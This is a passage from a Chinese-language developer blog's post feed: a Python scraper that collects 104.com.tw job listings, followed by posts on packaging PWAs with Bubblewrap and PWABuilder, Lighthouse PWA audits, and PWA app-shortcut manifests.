class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;des&quot;</span><span class="punctuation">:</span> <span class="string">&quot;台北市&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;no&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6001001000&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;des&quot;</span><span class="punctuation">:</span> <span class="string">&quot;台北市中正區&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;no&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6001001001&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;des&quot;</span><span class="punctuation">:</span> <span class="string">&quot;台北市大同區&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;no&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6001001002&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;des&quot;</span><span class="punctuation">:</span> <span class="string">&quot;新北市&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;no&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6001002000&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;des&quot;</span><span class="punctuation">:</span> <span class="string">&quot;新北市萬里區&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;no&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6001002001&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;des&quot;</span><span class="punctuation">:</span> <span class="string">&quot;新北市金山區&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;no&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6001002002&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 地區</span></span><br><span class="line">url = <span class="string">&#x27;https://static.104.com.tw/category-tool/json/Area.json&#x27;</span></span><br><span class="line"><span class="comment"># 抓出第 0 筆的 n</span></span><br><span class="line">areacode = pd.DataFrame(requests.get(url).json()[<span class="number">0</span>][<span class="string">&#x27;n&#x27;</span>])</span><br><span class="line"><span class="comment"># 把 n 展開</span></span><br><span class="line">areacode = areacode.explode(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"><span class="comment"># 取出展開的 n 中的 des 當成欄位中的 des2</span></span><br><span class="line">areacode[<span class="string">&#x27;des2&#x27;</span>] = areacode[<span class="string">&#x27;n&#x27;</span>].apply(<span class="keyword">lambda</span> x: x[<span class="string">&#x27;des&#x27;</span>])</span><br><span class="line"><span class="comment"># 取出展開的 n 中的 no 當成欄位中的 no2</span></span><br><span class="line">areacode[<span class="string">&#x27;no2&#x27;</span>] = areacode[<span class="string">&#x27;n&#x27;</span>].apply(<span class="keyword">lambda</span> x: x[<span class="string">&#x27;no&#x27;</span>])</span><br><span class="line"><span class="comment"># 拿掉展開的 n 欄位</span></span><br><span class="line">areacode = areacode.loc[:,[<span class="string">&#x27;des&#x27;</span>, <span class="string">&#x27;no&#x27;</span>, <span class="string">&#x27;des2&#x27;</span>, <span class="string">&#x27;no2&#x27;</span>]]</span><br><span class="line">areacode</span><br><span class="line"></span><br><span class="line"><span class="comment"># 產業別</span></span><br><span class="line">url = <span class="string">&#x27;https://static.104.com.tw/category-tool/json/Indust.json&#x27;</span></span><br><span class="line">Indust = pd.DataFrame(requests.get(url).json())</span><br><span class="line">Indust = Indust.explode(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">Indust[<span class="string">&#x27;des2&#x27;</span>] = Indust[<span class="string">&#x27;n&#x27;</span>].apply(<span class="keyword">lambda</span> x: x[<span class="string">&#x27;des&#x27;</span>])</span><br><span class="line">Indust[<span class="string">&#x27;no2&#x27;</span>] = Indust[<span class="string">&#x27;n&#x27;</span>].apply(<span class="keyword">lambda</span> x: x[<span class="string">&#x27;no&#x27;</span>])</span><br><span class="line">Indust[<span class="string">&#x27;n2&#x27;</span>] = Indust[<span class="string">&#x27;n&#x27;</span>].apply(<span class="keyword">lambda</span> x: x[<span class="string">&#x27;n&#x27;</span>])</span><br><span class="line">Indust = Indust.explode(<span class="string">&#x27;n2&#x27;</span>)</span><br><span class="line">Indust[<span class="string">&#x27;des3&#x27;</span>] = Indust[<span class="string">&#x27;n2&#x27;</span>].apply(<span class="keyword">lambda</span> x: x[<span class="string">&#x27;des&#x27;</span>])</span><br><span class="line">Indust[<span class="string">&#x27;no3&#x27;</span>] = Indust[<span class="string">&#x27;n2&#x27;</span>].apply(<span class="keyword">lambda</span> x: x[<span class="string">&#x27;no&#x27;</span>])</span><br><span class="line">Indust = Indust.loc[:,[<span class="string">&#x27;des&#x27;</span>, <span class="string">&#x27;no&#x27;</span>, <span class="string">&#x27;des2&#x27;</span>, <span class="string">&#x27;no2&#x27;</span>, <span class="string">&#x27;des3&#x27;</span>, <span class="string">&#x27;no3&#x27;</span>]]</span><br><span class="line">Indust</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="6"><li>跑迴圈把所有的資料抓下來</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">df = []</span><br><span class="line"><span class="keyword">for</span> area <span class="keyword">in</span> areacode[<span class="string">&#x27;no2&#x27;</span>].unique():</span><br><span class="line">    <span class="keyword">for</span> indcat <span class="keyword">in</span> Indust[<span class="string">&#x27;no2&#x27;</span>].unique():</span><br><span class="line">        page = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> page &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                url = <span class="string">f&#x27;https://www.104.com.tw/jobs/search/list?ro=1&amp;indcat=<span class="subst">&#123;indcat&#125;</span>&amp;area=<span class="subst">&#123;area&#125;</span>&amp;order=11&amp;asc=0&amp;page=<span class="subst">&#123;page&#125;</span>&amp;mode=l&#x27;</span></span><br><span class="line">                <span class="built_in">print</span>(url)</span><br><span class="line">                resp = requests.get(url, headers=headers)</span><br><span class="line">                ndf = pd.DataFrame(resp.json()[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;list&#x27;</span>])</span><br><span class="line">                df.append(ndf)</span><br><span class="line">                <span class="keyword">if</span> ndf.shape[<span class="number">0</span>] &lt; <span class="number">30</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                page = page + <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;==================== Error and retry ====================&#x27;</span>)</span><br><span class="line">        clear_output()</span><br><span class="line">df = pd.concat(df, ignore_index=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><ol start="7"><li>把檔案存起來，收工</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">df.to_excel(<span class="string">&#x27;./data/job_abs.xlsx&#x27;</span>)</span><br><span class="line">df.to_csv(<span class="string">&#x27;./data/job_abs.csv&#x27;</span>)</span><br><span class="line">df.to_pickle(<span class="string">&#x27;./data/job_abs.pkl&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>為了避免爬太久，有把條件減少，Github 中完整的 Gist 如下:</p><script src="https://gist.github.com/LinYenCheng/c480e235d83dcfa54b30e07a3a0a92c3.js"></script>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網站技術 </tag>
            
            <tag> Backend </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App 跨平台安裝上架</title>
      <link href="/2021/10/04/progressive-web-application/pwa-publish-a-pwa-to-store/"/>
      <url>/2021/10/04/progressive-web-application/pwa-publish-a-pwa-to-store/</url>
      
        <content type="html"><![CDATA[<h2 id="Progressive-Web-App-跨平台安裝"><a href="#Progressive-Web-App-跨平台安裝" class="headerlink" title="Progressive Web App 跨平台安裝"></a>Progressive Web App 跨平台安裝</h2><p>Progressive Web App 本身就具有能被安裝的特性，此外也能夠透過 Bubblewrap 或是 PWABuilder 封裝上架到各平台的市集。</p><ol><li>透過能安裝 Chrome 的平台，只要符合安裝條件就能夠被安裝</li><li>透過 Google 開發的 Bubblewrap 將 PWA 打包成 <code>.aab</code> 或是 <code>.apk</code></li><li>透過 Microsoft 開發的 PWABuilder (已整合 Bubblewrap)，將 PWA 打包成可以上架到 Windows、Google、Samsung 市集中的檔案</li></ol><h2 id="Progressive-Web-App-打包工具介紹"><a href="#Progressive-Web-App-打包工具介紹" class="headerlink" title="Progressive Web App 打包工具介紹"></a>Progressive Web App 打包工具介紹</h2><p>為什麼需要使用打包工具? 是因為現有解決方案像是 WebView 實際上還是無法取代瀏覽器。</p><ul><li>網頁在 App 上的功能會被 webview 限制</li><li>寫 cookie 要擔心 APP 實作怕出問題可能連 iFrame 也捨棄不用</li></ul><p>傳統的 Cordova、Electron 這類工具目的就是在克服以上這些問題，但變成需要維護更多東西。</p><p>近幾年出現的 Bubblewrap 則是基於 PWA 的標準去封裝，微軟的 PWA（Progressive Web Apps）團隊則進一步與 Google 進行合作，讓 PWABuilder 工具可以在底層執行 Google 的 Bubblewrap，可以產生 Google Play Store 的 App 封裝。</p><ul><li>Google Bubblewrap: 透過 Trusted Web Activity 容器將 PWA 顯示在 Android App 中</li><li>Microsoft PWABuilder<ul><li>Android 市集: 端整合了 Bubblewrap</li><li>Windows 市集: 整合了自有平台，以及利用了 Edge 底層也是 Chromium 的特性去支援</li><li>Samsung 市集: 根據小編開發 Tizen 的經驗，猜測是針對底層也是 Chromium 的市集上架</li></ul></li></ul><p>對漸進式增強的 PWA 來說，新功能只需要開發者簡單實作就能加入，透過 PWABuilder 封裝的 Web App 將可以支援:</p><ul><li>web shortcut 標準</li><li>Andorid 的狀態列</li><li>啟動畫面外觀</li><li>通知推播</li></ul><p>對微軟、Google 來說，這使得 PWABuilder 對開發者來說更有吸引力，最終就能達到增加市集內有針對平台進行優化的 web app 數量。</p><blockquote><p>Windows 市集中的 PWA (圖片來源: <a href="https://blog.pwabuilder.com/">https://blog.pwabuilder.com/</a>)<br><img src="https://blog.pwabuilder.com/posts/introducing-the-brand-new-pwa-builder/MicrosoftStorePWAs.jpg"></p></blockquote><h3 id="Bubblewrap"><a href="#Bubblewrap" class="headerlink" title="Bubblewrap"></a>Bubblewrap</h3><p>Bubblewrap 是一套能將符合 Trusted Web Activity 標準的 App 打包成 APK 或是 AAB 的封裝檔的工具。</p><p>Trusted Web Activity 則是一個開放標準，允許瀏覽器提供完全相容 Web 平台的容器，開發人員可以使用 Trusted Web Activity 作為容器來包含 PWA 作為 Android 應用程序的啟動 Activity。</p><p>透過容器在 Android APP 中呈現 PWA 的技術可以做到</p><ul><li>瀏覽器以全螢幕的方式呈現 PWA</li><li>確保 Trusted Web Activity 與底層瀏覽器的功能和 API 具相容性</li></ul><p>Trusted Web Activity 原則上也是要遵守 PWA 的安裝準則，符合之後就能夠透過 Bubblewrap 這套工具透過 Command Line 打包成 <code>.aab</code> 或是 <code>.apk</code> 的封裝檔。</p><h3 id="PWABuilder"><a href="#PWABuilder" class="headerlink" title="PWABuilder"></a>PWABuilder</h3><p>PWABuilder 不僅包含了 Bubblewrap 的實作，更進一步時做了 manifest 的效果預覽，也整合了 Android、Windows、Samsung 市集的封裝方式，讓 PWA 的開發人員只需要專注於一種寫法就能夠上架到三種平台。</p><ol><li>將 manifest 視覺化，能夠及時預覽 manifest 的效果</li></ol><blockquote><p>manifest 視覺化 (圖片來源: <a href="https://blog.pwabuilder.com/">https://blog.pwabuilder.com/</a>)<br><img src="https://blog.pwabuilder.com/posts/manifest-previewer/install-collage.png"></p></blockquote><ol start="2"><li>將符合 PWA 標準的程度量化，透過準則和分數來讓開發人員優化 PWA</li></ol><blockquote><p>量化 PWA 標準 (圖片來源: <a href="https://blog.pwabuilder.com/">https://blog.pwabuilder.com/</a>)<br><img src="https://blog.pwabuilder.com/posts/introducing-the-brand-new-pwa-builder/ScreenshotNewPWABuilder002.jpg"></p></blockquote><ol start="3"><li>透過 PWABuilder 也能夠幫助開發者將現有的網站轉換成 Progressive Web Apps</li></ol>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App Audits</title>
      <link href="/2021/10/03/progressive-web-application/pwa-audit/"/>
      <url>/2021/10/03/progressive-web-application/pwa-audit/</url>
      
        <content type="html"><![CDATA[<p>Web App 的效能會直接影響使用者體驗，也會影響到用戶會不會持續使用這個站台，當優化站台時可以多著重在使用者的效能體驗上，透過檢核項目與 Lighthouse Audits 可以更快速的優化站台。</p><ul><li>載入時間越長，跳出率越高</li><li>可以參考 RAIL user-centric performance model</li><li>PageSpeed Insights</li><li>Chrome User Experience Report</li></ul><h2 id="什麼是-Lighthouse-Audits"><a href="#什麼是-Lighthouse-Audits" class="headerlink" title="什麼是 Lighthouse Audits?"></a>什麼是 Lighthouse Audits?</h2><p>Lighthouse 是一套整合在 DevTools 中的開放原始碼檢測工具，用來檢測效能、可靠性、SEO、PWA 等指標是否符合。</p><p>以 PWA 來說主要會分成三大部份去審核</p><ol><li>網站效能與可靠性</li></ol><ul><li>透過手機瀏覽效能</li><li>頁面無法離線使用且沒有<a href="https://linyencheng.github.io/2021/09/13/progressive-web-application/pwa-offline-fallback/">離線後備頁面</a></li></ul><ol start="2"><li>Installable</li></ol><ul><li>是否採用 HTTPS</li><li>是否在 start_url 頁面有引入 Service Worker</li><li>manifest 沒有符合<a href="https://linyencheng.github.io/2021/09/06/progressive-web-application/pwa-manifest/">相關安裝規範</a></li></ul><ol start="3"><li>PWA 最佳化</li></ol><ul><li>所有連結合資源都有 redirect 到 HTTPS</li><li>配置 App 的啟動螢幕相關設定<ul><li><code>name</code> 有設定</li><li><code>background_color</code> 正確</li><li>icons array 中至少有 512x512 px PNG 圖</li></ul></li><li>針對網址列的 theme color，meta 也要記得 <code>&lt;meta name=&quot;theme-color&quot; content=&quot;#317EFB&quot;/&gt;</code></li><li>內容大小是否符合手機裝置大小不會破版</li><li>設定 <meta name="viewport"> 並設定 width 跟 initial-scale</li><li>提供停用 JavaScript 的相關後備內容</li><li>提供 apple-touch-icon</li></ul><p><img src="https://guanqr.com/images/lighthouse-pwa.png" alt="PWA 最佳化"></p><h3 id="選修優化項目"><a href="#選修優化項目" class="headerlink" title="選修優化項目"></a>選修優化項目</h3><p>除了上面幾項必修以外，還有幾項選修可以參考優化</p><ul><li>提供無障礙的設計</li><li>做好 SEO 讓 PWA 更容易被取用</li><li>滑鼠、鍵盤、觸控都要能夠操作，甚至是特殊情境像是手機瀏覽器的下拉更新不應該影響操作</li><li>要權限前詢問的方式可優化 (圖片來源: thinkwithgoogle)</li></ul><h2 id="網站效能與可靠性"><a href="#網站效能與可靠性" class="headerlink" title="網站效能與可靠性"></a>網站效能與可靠性</h2><p>網站效能上主要有兩大考量，大多可以透過快取解決</p><ul><li>First Meaningful Paint (FMP): 主要內容要多久才出現</li><li>Time to Interactive (TTI): 網站可以操作</li></ul><p>可靠性，也和剛剛說的快取相關，本來要去 server 拿的資料變成快取在瀏覽器的儲存空間中。</p><p>透過實作 service worker 來處理儲存的快取，可以想像成做一個 Client 端的 response cache，這樣就不需要每次都向 Server 要東西。</p><h3 id="Cache"><a href="#Cache" class="headerlink" title="Cache"></a>Cache</h3><p>查了一些快取相關資料後，發現這篇關於<a href="http://blog.techbridge.cc/2017/06/17/cache-introduction/">cache</a>的寫得很詳細。</p><ul><li>常用又不太需要更改的函式庫改成使用 CDN 取得</li><li>有使用 Webpack 的話需要把這些函式庫加入 externals 並透過 ProvidePlugin 給命名</li><li>lodash 這類工具包可以只引用部分</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">externals</span>: &#123;</span><br><span class="line">    <span class="attr">jquery</span>: <span class="string">&#x27;jQuery&#x27;</span>,</span><br><span class="line">    <span class="attr">lodash</span>: <span class="string">&#x27;_&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line"><span class="attr">plugins</span>:  [</span><br><span class="line">    <span class="keyword">new</span> webpack.<span class="title class_">ProvidePlugin</span>(&#123;</span><br><span class="line">      <span class="attr">$</span>: <span class="string">&#x27;jquery&#x27;</span>,</span><br><span class="line">      <span class="attr">jQuery</span>: <span class="string">&#x27;jquery&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;window.jQuery&#x27;</span>: <span class="string">&#x27;jquery&#x27;</span>,</span><br><span class="line">      <span class="attr">_</span>: <span class="string">&#x27;lodash&#x27;</span>,</span><br><span class="line">    &#125;),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="效能-Performance"><a href="#效能-Performance" class="headerlink" title="效能 (Performance)"></a>效能 (Performance)</h3><ol><li>SPA 可以加入 server render</li><li>webpack 的話可以使用 Code-splitting</li><li>有使用格線系統像是 bootstrap 可以做 custom build 來減少 css 載入時間</li><li>圖片的 lazy load</li></ol><p>不過有個問題就是當某些情境下還是會需要高解析度的圖片如何處理?</p><ul><li>後端自動處理圖片成各種解析度，透過規則來取用</li><li>使用較新潮高壓縮比的格式</li></ul><h2 id="提供頁面離線瀏覽"><a href="#提供頁面離線瀏覽" class="headerlink" title="提供頁面離線瀏覽"></a>提供頁面離線瀏覽</h2><p>當用戶處於離線狀態，讓 PWA 仍然能夠有基本的功能，舉例來說 Chrome 在前幾年時就推出了離線小恐龍遊戲，對 PWA 來說，就是能夠提供基礎的功能。</p><p>當用戶安裝過後，多少會預期能夠離線使用，所以在網站設計時，PWA 要能夠做到安裝後打開時並不會是一片白。</p><p>若是瀏覽到未被快取的頁面:</p><ul><li>要適當提供相關提示</li><li>提供 skeleton 的設計畫面</li></ul><p>實作上，當 service worker 這個網路相關代理小秘書有做好相關設定，原則上就可以快取相關的資源到本機端進行後續利用，像是圖片、影片資源等等。</p><h3 id="離線儲存"><a href="#離線儲存" class="headerlink" title="離線儲存"></a>離線儲存</h3><p>當決定好哪些功能要支援離線使用時，就會需要將資源儲存在本機端，瀏覽器提供:</p><ul><li>IndexedDB</li><li>NoSQL storage system</li></ul><p>開發者需要注意的是何時進行資料的撈取及更新，像是處理用戶從離線狀態恢復有網路時的情境轉換。</p><h2 id="支援安裝到手機"><a href="#支援安裝到手機" class="headerlink" title="支援安裝到手機"></a>支援安裝到手機</h2><p>既然是叫 Web App 那就要讓 App 能夠被安裝，不管是使用上、實際上都能夠更接近 Native App。</p><ul><li>啟動到執行流程跟其他 App 相同</li><li>能不透過瀏覽器視窗執行</li><li>獨立出現在工作管理員</li></ul><p>簡單講一下配置過程，其實只是需要 https 環境並加入以下配置，然後撰寫相對應的 manifest.json 檔。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;manifest&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/manifest.json&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h2 id="跨瀏覽器支援"><a href="#跨瀏覽器支援" class="headerlink" title="跨瀏覽器支援"></a>跨瀏覽器支援</h2><p>用戶理論上在安裝前要可以用任何瀏覽器瀏覽 Web App，PWA 其實本質上還是網頁，代表著需要處理跨瀏覽器相容的問題，Jeremy Keith 提出了 Resilient Web Design 的概念，指出:</p><ul><li>即使遇到錯誤，App 能夠反應並照常運作</li><li>不論任何裝置，核心功能都能以最低需求的方式運行，在支援度高的裝置則增強用戶體驗<ul><li>HTML 提供基礎功能，CSS 和 JS 屬於加強體驗</li></ul></li></ul><p>以一個表單來說</p><ol><li>HTML 的 form 加上 submit 是基本寫法</li><li>加入表單欄位驗證、透過 ajax 送出是進階寫法</li></ol><p>雖然沒讀完，不過還是推薦有空的大大們有機會可以拜讀 Jeremy Keith 的 <a href="https://resilientwebdesign.com/">Resilient Web Design</a>，去了解怎麼有方法論的去實作跨瀏覽器的支援。</p><h2 id="支援不同大小螢幕"><a href="#支援不同大小螢幕" class="headerlink" title="支援不同大小螢幕"></a>支援不同大小螢幕</h2><p>讓用戶可以透過任何解析度、各種大小螢幕來瀏覽網頁。</p><p>近幾年裝置的大小比例越來越多元，即便在同個裝置也會有不同的解析度，因此確保網站內容要在每個狀態下都可以正常顯示是很重要的。</p><h3 id="Responsive-Design"><a href="#Responsive-Design" class="headerlink" title="Responsive Design"></a>Responsive Design</h3><p>行動裝置上由於顯示空間上的受限，所以會特別需要去注意一些功能的設計，目前網路上有很多關於 responsive design 的介紹，也有很多前端工具像是 Bootstrap 預設就提供了這樣的設計。</p><h3 id="Content-first-Design"><a href="#Content-first-Design" class="headerlink" title="Content-first Design"></a>Content-first Design</h3><p>另外一種角度是從內容的角度出發去設計整個 App，透過內容去影響排版的響應。</p><p><img src="https://miro.medium.com/max/802/1*S6_10X0PzJQZPNEAXnY3EA.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App Shortcuts</title>
      <link href="/2021/10/02/progressive-web-application/pwa-app-shortcuts/"/>
      <url>/2021/10/02/progressive-web-application/pwa-app-shortcuts/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-App-Shortcuts"><a href="#什麼是-App-Shortcuts" class="headerlink" title="什麼是 App Shortcuts"></a>什麼是 App Shortcuts</h2><p>App Shortcuts 提供程式快速啟動選單，透過這個捷徑用戶能夠更快速的使用各式功能，讓常用且關鍵的功能更容易被快速重複使用。</p><p>目前 PWA 快速啟動選單僅限於安裝完成的 Progressive Web App 相關的支援度如下</p><ul><li>Android (Chrome 84): 透過長按桌面上的 Icon</li><li>Windows、macOS (Chrome 85 and Edge 85): 開始捷徑列上的 Icon 按右鍵</li><li>Chrome OS (Chrome 92)</li></ul><blockquote><p>快速啟動選單 (圖片來源: <a href="https://web-dev/">https://web-dev</a>)<br><img src="https://web-dev.imgix.net/image/admin/RoF6k7Aw6WNvaEcsgIcb.png?auto=format&w=1098"></p></blockquote><h2 id="App-Shortcuts-Menu-應用場景"><a href="#App-Shortcuts-Menu-應用場景" class="headerlink" title="App Shortcuts Menu 應用場景"></a>App Shortcuts Menu 應用場景</h2><p>那 PWA 快速啟動選單 (App Shortcuts Menu) 解決了什麼問題?</p><p>選單中的每個列表其實都可以看成一項用戶意圖 (user intent)，這個部分在 Web App 設計架構時就要將相關的 URL 一起設計進去整個 App 的 Scope 中，舉幾個適合的例子來說:</p><ul><li>第一層導航欄: 首頁、最近的訂單</li><li>搜尋功能: 列車時刻就可以搭配個人常用起終點</li><li>任務: 寫一封新信、發一篇文章</li><li>常用活動: 打開跟家人的聊天群組</li></ul><h2 id="App-Shortcuts-配置"><a href="#App-Shortcuts-配置" class="headerlink" title="App Shortcuts 配置"></a>App Shortcuts 配置</h2><p>shortcuts 在 web app 的 manifest 中是選填欄位，manifest 這個檔案是一個 JSON 配置檔，瀏覽器就是透過這個檔案將 Progressive Web App 安裝到裝置上。</p><p>shortcuts 會是一個陣列，陣列中會有每個啟動選單的相關配置包含</p><ul><li>name、short_name: 名稱必填</li><li>url: 捷徑連結必填</li><li>description: 描述選填</li><li>icons: 不同於主程式的 icon 選填</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Player FM&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;start_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// … 其它配置</span></span><br><span class="line">  <span class="attr">&quot;shortcuts&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Open Play Later&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;short_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Play Later&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;View the list of podcasts you saved for later&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/play-later?utm_source=homescreen&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;icons&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span> <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/icons/play-later.png&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192x192&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;View Subscriptions&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;short_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Subscriptions&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;View the list of podcasts you listen to&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/subscriptions?utm_source=homescreen&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;icons&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span> <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/icons/subscriptions.png&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192x192&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="shortcuts-配置驗證"><a 